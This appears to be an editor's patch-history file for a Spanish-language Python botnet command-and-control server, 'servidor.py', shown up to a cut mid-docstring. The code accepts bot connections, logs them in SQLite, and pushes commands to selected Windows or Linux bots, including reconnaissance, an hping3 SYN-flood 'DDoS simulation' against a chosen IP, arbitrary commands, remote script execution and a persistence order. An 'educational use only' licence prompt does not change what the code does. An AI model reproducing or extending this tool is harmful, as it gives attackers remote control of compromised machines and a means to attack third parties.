{
    "sourceFile": "src/servidor.py",
    "activeCommit": 0,
    "commits": [
        {
            "activePatchIndex": 8,
            "patches": [
                {
                    "date": 1740219834635,
                    "content": "Index: \n===================================================================\n--- \n+++ \n"
                },
                {
                    "date": 1740219871862,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -576,8 +576,36 @@\n     :type tipo_comando: str\r\n     \"\"\"\r\n     try:\r\n         logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qu茅 bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot espec铆fico\")\r\n+        print(\"5. Lista de bots espec铆ficos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opci贸n: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n                     print(\"ID de bot no v谩lido.\")\r\n                     return\r\n             except ValueError:\r\n                 print(\"ID inv谩lido. Debe ingresar un n煤mero.\")\r\n"
                },
                {
                    "date": 1740219965135,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -239,41 +239,41 @@\n     except Exception as e:\r\n         logging.error(f\"Error al verificar el EULA: {e}\")\r\n         exit()\r\n \r\n-def manejar_bot(conn, addr, bot_id, config):\r\n+def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n     \"\"\"\r\n-    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n+    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n \r\n-    :param conn: El socket del bot conectado.\r\n-    :type conn: socket.socket\r\n-    :param addr: La direcci贸n IP y puerto del bot.\r\n-    :type addr: tuple\r\n-    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n-    :type bot_id: int\r\n     :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param identificador: El identificador 煤nico del bot.\r\n+    :type identificador: str\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    :param hostname: El nombre del host del bot.\r\n+    :type hostname: str\r\n+    :param os: El sistema operativo del bot.\r\n+    :type os: str\r\n     \"\"\"\r\n     try:\r\n-        ip, port = addr\r\n-        hostname = socket.gethostbyaddr(ip)[0]\r\n-        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n-        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n+        bot = cursor.fetchone()\r\n+        if bot:\r\n+            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n+            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        else:\r\n+            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n+            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        conn.commit()\r\n+        conn.close()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n \r\n-        # Recibir identificador 煤nico\r\n-        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n-        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n+def manejar_bot(conn, addr, bot_id, config):\r\n+    \"\"\"\r\n \r\n-        # Detectar sistema operativo\r\n-        try:\r\n-            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-            sistemas_operativos[conn] = os\r\n-            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n-        except Exception as e:\r\n-            print(f\"Error al detectar OS de {addr}: {e}\")\r\n-            os = \"desconocido\"\r\n-\r\n         agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n \r\n         while True:\r\n             try:\r\n"
                },
                {
                    "date": 1740219989610,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,858 @@\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import requests\r\n+import sqlite3\r\n+import configparser\r\n+from datetime import datetime\r\n+\r\n+bots = [] # List de bots\r\n+bot_ids = {} # Diccinario con los IDS de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las 煤ltimas respuestas de los bots\r\n+ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot\r\n+server_running = True  # Variable para controlar el estado del servidor\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"\r\n+    Configura el sistema de logging del servidor.\r\n+\r\n+    El nivel de log se establece seg煤n la clave \"LOG_LEVEL\" en el objeto de configuraci贸n.\r\n+    El nivel de log puede ser \"DEBUG\", \"INFO\", \"WARNING\", \"ERROR\" o \"CRITICAL\".\r\n+    Si no se especifica un nivel de log, se establece en \"INFO\" por defecto.\r\n+\r\n+    La ruta del archivo de log se establece seg煤n la clave \"LOG_FILE\" en el objeto de configuraci贸n.\r\n+    La ruta se crea si no existe.\r\n+\r\n+    El formato de los mensajes de log se establece en \"%(asctime)s - %(levelname)s - %(message)s\".\r\n+\r\n+    Los mensajes de log se escriben en el archivo de log y en la consola.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        log_level = config[\"LOG_LEVEL\"].upper()\r\n+        log_file = config[\"SERVER_LOG_FILE\"]\r\n+\r\n+        log_levels = {\r\n+            \"DEBUG\": logging.DEBUG,\r\n+            \"INFO\": logging.INFO,\r\n+            \"WARNING\": logging.WARNING,\r\n+            \"ERROR\": logging.ERROR,\r\n+            \"CRITICAL\": logging.CRITICAL\r\n+        }\r\n+        log_level = log_levels.get(log_level, logging.INFO)\r\n+\r\n+        os.makedirs(os.path.dirname(log_file), exist_ok=True)\r\n+\r\n+        logging.basicConfig(\r\n+            level=log_level,\r\n+            format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+            handlers=[\r\n+                logging.FileHandler(log_file, encoding=\"utf-8\"),\r\n+                logging.StreamHandler(sys.stdout)\r\n+            ]\r\n+        )\r\n+\r\n+        logging.info(\"Sistema de logging configurado correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al configurar el logging: {e}\")\r\n+\r\n+# Inicializar la base de datos\r\n+def init_db(DB_PATH):\r\n+    \"\"\"\r\n+    Inicializa la base de datos SQLite para almacenar informaci贸n sobre los bots y sus respuestas.\r\n+\r\n+    Crea la carpeta y el archivo de la base de datos si no existe,\r\n+    y crea las tablas \"bots\" y \"respuestas\" si no existen.\r\n+\r\n+    :param DB_PATH: La ruta del archivo de la base de datos.\r\n+    :type DB_PATH: str\r\n+    \"\"\"\r\n+    try:\r\n+        db_dir = os.path.dirname(DB_PATH)\r\n+        if not os.path.exists(db_dir):\r\n+            os.makedirs(db_dir)  # Crear carpeta si no existe\r\n+\r\n+        conn = sqlite3.connect(DB_PATH)\r\n+        cursor = conn.cursor()\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            identificador TEXT UNIQUE,\r\n+                            ip TEXT,\r\n+                            hostname TEXT,\r\n+                            os TEXT,\r\n+                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP\r\n+                        )''')\r\n+\r\n+        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (\r\n+                            id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n+                            bot_id INTEGER,\r\n+                            respuesta TEXT,\r\n+                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\r\n+                            FOREIGN KEY (bot_id) REFERENCES bots (id)\r\n+                        )''')\r\n+\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(\"Base de datos inicializada correctamente.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al inicializar la base de datos: {e}\")\r\n+\r\n+def agregar_respuesta_en_db(config, bot_id, respuesta):\r\n+    \"\"\"\r\n+    Agrega una respuesta de un bot a la base de datos SQLite.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param bot_id: El ID del bot que envi贸 la respuesta.\r\n+    :type bot_id: int\r\n+    :param respuesta: La respuesta del bot.\r\n+    :type respuesta: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"INSERT INTO respuestas (bot_id, respuesta, timestamp) VALUES (?, ?, ?)\", (bot_id, respuesta, datetime.now()))\r\n+        conn.commit()\r\n+        conn.close()\r\n+        logging.info(f\"Respuesta del bot {bot_id} agregada a la base de datos.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar la respuesta del bot en la base de datos: {e}\")\r\n+\r\n+def detectarEntornoCloud():\r\n+    \r\n+    \"\"\"\r\n+    Detecta si el entorno actual es un entorno de cloud computing.\r\n+\r\n+    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para \r\n+    determinar si el c贸digo se ejecuta en un entorno de nube. Si se logra \r\n+    conectar exitosamente a cualquiera de estos servicios, se asume que el \r\n+    entorno es un entorno de cloud y se devuelve True. En caso contrario, \r\n+    se devuelve False.\r\n+\r\n+    Returns:\r\n+        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.\r\n+    \"\"\"\r\n+    try:\r\n+        try:\r\n+            # AWS Metadata\r\n+            if requests.get(\"http://169.254.169.254/latest/meta-data/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        try:\r\n+            # Google Cloud Metadata\r\n+            if requests.get(\"http://metadata.google.internal/\", timeout=1).status_code == 200:\r\n+                logging.info(\"Entorno de cloud computing detectado.\")\r\n+                return True\r\n+        except requests.exceptions.RequestException:\r\n+            pass\r\n+\r\n+        return False\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al detectar el entorno cloud: {e}\")\r\n+        return False\r\n+\r\n+def esRedPrivada(ip):\r\n+    \"\"\"Indica si una IP es de una red privada o no.\r\n+\r\n+    La funci贸n intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve\r\n+    el resultado de llamar a su m茅todo is_private(). Si la IP no es v谩lida,\r\n+    devuelve False.\r\n+\r\n+    Parameters:\r\n+    ip (str): La IP a verificar.\r\n+\r\n+    Returns:\r\n+    bool: True si la IP es de una red privada, False si no lo es.\r\n+    \"\"\"\r\n+    try:\r\n+        result = ipaddress.ip_address(ip).is_private\r\n+        logging.info(f\"Verificaci贸n de red privada para la IP: {ip}\")\r\n+        return result\r\n+    except ValueError as e:\r\n+        logging.error(f\"Error al verificar si la IP es privada: {e}\")\r\n+        return False\r\n+\r\n+def verificar_eula(tipo):\r\n+    \"\"\"\r\n+    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.\r\n+    \r\n+    :param tipo: \"servidor\" o \"cliente\" para determinar qu茅 EULA verificar.\r\n+    \"\"\"\r\n+    try:\r\n+        if tipo not in [\"servidor\", \"cliente\"]:\r\n+            raise ValueError(\"Tipo de EULA no v谩lido. Debe ser 'servidor' o 'cliente'.\")\r\n+\r\n+        # Ruta para el archivo EULA en la carpeta docs\r\n+        BASE_DIR = os.path.dirname(os.path.abspath(__file__))\r\n+        eula_path = os.path.join(BASE_DIR, \"..\", \"docs\", f\"eula_{tipo}.txt\")\r\n+\r\n+        # Si no existe, lo crea\r\n+        if not os.path.exists(eula_path):\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=False\")\r\n+\r\n+        # Leer si ya acept贸\r\n+        with open(eula_path, \"r\") as f:\r\n+            for linea in f:\r\n+                if \"ACCEPTED=True\" in linea:\r\n+                    logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+                    return True\r\n+\r\n+        # Mostrar Acuerdo de Licencia\r\n+        print(\"\\n\" + \"=\"*50)\r\n+        print(f\"  ACUERDO DE LICENCIA ({tipo.upper()}) \")\r\n+        print(\"=\"*50)\r\n+        print(\"\\nEste software es exclusivamente para prop贸sitos educativos y de investigaci贸n.\")\r\n+        print(\"El uso en redes ajenas sin autorizaci贸n est谩 prohibido.\")\r\n+        print(\"El usuario debe cumplir con las leyes de su pa铆s.\")\r\n+        print(\"No se permite el uso de este software en redes p煤blicas.\")\r\n+        print(\"El autor no se hace responsable del uso indebido.\\n\")\r\n+        print(\"EL SOFTWARE NO FUNCIONAR FUERA DE UNA RED PRIVADA.\\n\")\r\n+        \r\n+        print(\"  QUEDA TERMINANTEMENTE PROHIBIDO:\")\r\n+        print(\"   - Usarlo con intenciones maliciosas.\")\r\n+        print(\"   - Ejecutarlo en infraestructuras cr铆ticas sin permiso.\")\r\n+        print(\"   - Modificarlo para evadir restricciones.\")\r\n+        print(\"   - Distribuirlo con fines ilegales o comerciales.\\n\")\r\n+        \r\n+        print(\"  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\\n\")\r\n+        \r\n+        respuesta = input(\"Escriba 'ACEPTO' para continuar: \").strip().upper()\r\n+        \r\n+        if respuesta == \"ACEPTO\":\r\n+            with open(eula_path, \"w\") as f:\r\n+                f.write(\"ACCEPTED=True\")\r\n+            logging.info(f\"Verificaci贸n de EULA para el tipo: {tipo}\")\r\n+            return True\r\n+        else:\r\n+            print(\"Debe aceptar la licencia para usar este software.\")\r\n+            exit()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al verificar el EULA: {e}\")\r\n+        exit()\r\n+\r\n+def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):\r\n+    \"\"\"\r\n+    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.\r\n+\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    :param identificador: El identificador 煤nico del bot.\r\n+    :type identificador: str\r\n+    :param ip: La direcci贸n IP del bot.\r\n+    :type ip: str\r\n+    :param hostname: El nombre del host del bot.\r\n+    :type hostname: str\r\n+    :param os: El sistema operativo del bot.\r\n+    :type os: str\r\n+    \"\"\"\r\n+    try:\r\n+        conn = sqlite3.connect(config[\"DB_PATH\"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)\r\n+        cursor = conn.cursor()\r\n+        cursor.execute(\"SELECT id FROM bots WHERE identificador = ?\", (identificador,))\r\n+        bot = cursor.fetchone()\r\n+        if bot:\r\n+            cursor.execute(\"UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?\", (ip, hostname, os, datetime.now(), identificador))\r\n+            logging.info(f\"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        else:\r\n+            cursor.execute(\"INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)\", (identificador, ip, hostname, os, datetime.now()))\r\n+            logging.info(f\"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}\")\r\n+        conn.commit()\r\n+        conn.close()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al agregar o actualizar el bot en la base de datos: {e}\")\r\n+\r\n+def manejar_bot(conn, addr, bot_id, config):\r\n+    \"\"\"\r\n+    Maneja una conexi贸n de bot y la agrega o actualiza en la base de datos.\r\n+\r\n+    :param conn: El socket del bot conectado.\r\n+    :type conn: socket.socket\r\n+    :param addr: La direcci贸n IP y puerto del bot.\r\n+    :type addr: tuple\r\n+    :param bot_id: El ID del bot, que se usar谩 para identificarlo.\r\n+    :type bot_id: int\r\n+    :param config: Un objeto con la configuraci贸n del servidor.\r\n+    \"\"\"\r\n+    try:\r\n+        ip, port = addr\r\n+        hostname = socket.gethostbyaddr(ip)[0]\r\n+        logging.info(f\"Bot {bot_id} conectado desde {addr}\")\r\n+        print(f\"Bot {bot_id} conectado desde {addr}\")\r\n+\r\n+        # Recibir identificador 煤nico\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        logging.info(f\"Identificador 煤nico recibido: {identificador}\")\r\n+\r\n+        # Detectar sistema operativo\r\n+        try:\r\n+            conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+            os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+            os = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+            sistemas_operativos[conn] = os\r\n+            print(f\"Bot {bot_id} identificado como {os.capitalize()}\")\r\n+        except Exception as e:\r\n+            print(f\"Error al detectar OS de {addr}: {e}\")\r\n+            os = \"desconocido\"\r\n+\r\n+        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)\r\n+\r\n+        while True:\r\n+            try:\r\n+                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n+                if not data:\r\n+                    continue\r\n+\r\n+                # Guardar la respuesta en el diccionario sin imprimirla\r\n+                respuestas_bots[bot_id] = data\r\n+                actualizar_bot_en_db(config, ip)\r\n+                agregar_respuesta_en_db(config, bot_id, data)\r\n+\r\n+            except socket.timeout:\r\n+                print(f\"Tiempo de espera agotado con {addr}.\")\r\n+            except Exception as e:\r\n+                print(f\"Error con {addr}: {e}\")\r\n+                break\r\n+\r\n+        # Manejo de desconexi贸n\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al manejar el bot {bot_id}: {e}\")\r\n+    finally:\r\n+        conn.close()\r\n+        logging.info(f\"Bot {bot_id} desconectado\")\r\n+        print(f\"Bot {bot_id} desconectado\")\r\n+\r\n+def servidor_CnC(HOST, PORT):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia\r\n+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo\r\n+    para aceptar conexiones y entra en un bucle para mostrar un men煤 principal\r\n+    que permite al usuario interactuar con los bots conectados.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Iniciando servidor CnC en {HOST}:{PORT}\")\r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket\r\n+        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto\r\n+        server.listen(5) # Escuchar conexiones\r\n+        print(f\"Escuchando en {HOST}:{PORT}...\") # Imprimir que el servidor esta escuchando\r\n+        \r\n+        threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones\r\n+\r\n+        while server_running:\r\n+            print(\"\\nMen煤 Principal:\")\r\n+            print(\"1. Listar bots conectados\")\r\n+            print(\"2. Enviar comandos\")\r\n+            print(\"3. Cerrar conexi贸n con un bot\")\r\n+            print(\"4. Salir\")\r\n+            opcion = input(\"Seleccione una opci贸n: \")\r\n+\r\n+            if opcion == \"1\":\r\n+                listar_bots()\r\n+            elif opcion == \"2\":\r\n+                menu_comandos()\r\n+            elif opcion == \"3\":\r\n+                cerrar_conexion_bots()\r\n+            elif opcion == \"4\":\r\n+                logging.info(\"Servidor CnC detenido\")\r\n+                print(\"Saliendo de la consola...\")\r\n+                server_running = False\r\n+                server.close()\r\n+                break\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida. Intente de nuevo.\")\r\n+        \r\n+        # Esperar a que todos los hilos de bots terminen\r\n+        for bot in bots:\r\n+            bot.close()\r\n+        for thread in threading.enumerate():\r\n+            if thread is not threading.current_thread():\r\n+                thread.join()\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el servidor CnC: {e}\")\r\n+\r\n+def aceptar_conexiones(server):\r\n+    global server_running\r\n+    \"\"\"\r\n+    Acepta conexiones de bots y las asigna a un hilo para manejarlas.\r\n+\r\n+    Este hilo infinito espera conexiones de bots y las asigna a la lista de\r\n+    bots conectados. A cada bot se le asigna un ID 煤nico y se crea un hilo\r\n+    para manejar la conexi贸n. El hilo maneja_bot se encarga de recibir los\r\n+    mensajes del bot, detectar el sistema operativo y ejecutar comandos\r\n+    enviados por el usuario.\r\n+\r\n+    :param server: El socket del servidor C&C.\r\n+    :type server: socket.socket\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Aceptando conexiones de bots\")\r\n+        bot_id = 1 # Contador de bots\r\n+        while server_running:\r\n+            try:\r\n+                conn, addr = server.accept() # Aceptar la conexi贸n\r\n+                bots.append(conn) # Agregar el bot a la lista\r\n+                bot_ids[conn] = bot_id # Asignar el ID del bot\r\n+                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexi贸n\r\n+                bot_id += 1 # Incrementar el contador de bots\r\n+            except OSError:\r\n+                if not server_running:\r\n+                    break\r\n+                else:\r\n+                    raise\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al aceptar conexiones: {e}\")\r\n+\r\n+def listar_bots():\r\n+    \"\"\"\r\n+    Muestra la lista de bots conectados al servidor C&C, incluyendo\r\n+    su identificador, sistema operativo y direcci贸n IP y puerto de\r\n+    conexi贸n.\r\n+    \r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Listando bots conectados\")\r\n+        if bots:\r\n+            print(\"\\nBots conectados:\")\r\n+            for bot in bots: # Recorrer la lista de bots\r\n+                so = sistemas_operativos.get(bot, \"Desconocido\") # Obtener el SO del bot\r\n+                print(f\"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}\") # Imprimir el bot\r\n+        else:\r\n+            print(\"No hay bots conectados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+\r\n+def menu_comandos():\r\n+    \r\n+    \"\"\"\r\n+    Muestra el men煤 de comandos disponibles para ejecutar en los bots\r\n+    conectados y permite al usuario seleccionar una orden para ejecutar en\r\n+    todos los bots o en algunos seleccionados manualmente.\r\n+\r\n+    :return: None\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Mostrando men煤 de comandos\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione el tipo de comandos:\")\r\n+        print(\"1. Comandos b谩sicos\")\r\n+        print(\"2. Comandos avanzados\")\r\n+        tipo_comando = input(\"Ingrese su opci贸n: \")\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            print(\"\\nComandos b谩sicos disponibles:\")\r\n+            print(\"1. Obtener informaci贸n del sistema\")\r\n+            print(\"2. Consultar conexiones de red\")\r\n+            print(\"3. Ver procesos en ejecuci贸n\")\r\n+            print(\"4. Listar archivos en el directorio actual\")\r\n+            print(\"5. Obtener la IP p煤blica\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            print(\"\\nComandos avanzados disponibles:\")\r\n+            print(\"1. Simular ataque DDoS\")\r\n+            print(\"2. Detener simulaci贸n de DDoS\")\r\n+            print(\"3. Ejecutar un comando personalizado\")\r\n+            print(\"4. Ejecutar un script remoto\")\r\n+            print(\"5. Intentar asegurar la persistencia\")\r\n+            orden = input(\"Seleccione una orden: \")\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                objetivo = input(\"Ingrese la direcci贸n IP del objetivo: \")\r\n+                puerto = input(\"Ingrese el puerto del objetivo: \")\r\n+                protocolo = input(\"Ingrese el protocolo (TCP/UDP): \").upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    print(\"Protocolo no v谩lido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                comando_windows = input(\"Ingrese el comando personalizado para Windows: \")\r\n+                comando_linux = input(\"Ingrese el comando personalizado para Linux: \")\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                print(\"Seleccione el tipo de script:\")\r\n+                print(\"1. Python\")\r\n+                print(\"2. Bash\")\r\n+                print(\"3. Otro (especificar)\")\r\n+                \r\n+                tipo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    extension = input(\"Ingrese la extensi贸n del script (ejemplo: ps1, rb, pl): \")\r\n+                    interprete_linux = input(\"Ingrese el comando para ejecutarlo en Linux: \")\r\n+                    interprete_windows = input(\"Ingrese el comando para ejecutarlo en Windows: \")\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                print(\"\\n驴C贸mo desea proporcionar el script?\")\r\n+                print(\"1. Escribirlo aqu铆\")\r\n+                print(\"2. Proporcionar la ruta de un archivo\")\r\n+                \r\n+                metodo = input(\"Ingrese la opci贸n: \")\r\n+\r\n+                if metodo == \"1\":\r\n+                    print(f\"Escriba su script en {extension}. Finalice con 'EOF' en una l铆nea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        try:\r\n+                            linea = input()\r\n+                            if linea.strip().upper() == \"EOF\":  # Detectar EOF\r\n+                                break\r\n+                            lineas.append(linea)\r\n+                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir\r\n+                            print(\"\\nEntrada cancelada.\")\r\n+                            return\r\n+                    script = \"\\n\".join(lineas)  # Unir l铆neas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    ruta = input(\"Ingrese la ruta del archivo: \")\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        print(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    print(\"Opci贸n inv谩lida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecuci贸n remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                print(\"\\nIntentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                print(\"Opci贸n no v谩lida.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opci贸n no v谩lida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el men煤 de comandos: {e}\")\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \r\n+    \"\"\"\r\n+    Env铆a un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: 